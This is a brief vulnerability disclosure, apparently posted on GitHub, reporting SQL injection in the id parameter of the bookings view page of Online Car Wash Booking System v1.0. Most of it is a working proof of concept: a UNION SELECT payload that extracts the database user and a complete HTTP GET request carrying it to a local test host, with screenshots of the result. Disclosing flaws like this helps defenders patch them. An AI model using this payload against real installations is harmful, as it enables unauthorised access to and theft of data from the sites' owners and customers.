# Online Car Wash Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File: /ocwbs/admin/?page=bookings/view_details&id=

Vulnerability location: /ocwbs/admin/?page=bookings/view_details&id=, id

[+] Payload: /ocwbs/admin/?page=bookings/view_details&id=-3%27%20union%20select%201,user(),3,4,5,6,7,8,9,10,11,12,13--+ // Leak place ---> id

```sql
GET /ocwbs/admin/?page=bookings/view_details&id=-3%27%20union%20select%201,user(),3,4,5,6,7,8,9,10,11,12,13--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/169299644-dae0ed6e-405d-4e38-ac42-52dc09089418.png)

![image](https://user-images.githubusercontent.com/54017627/169299572-8b78dd13-4621-482f-9470-f62ecfbe908e.png)
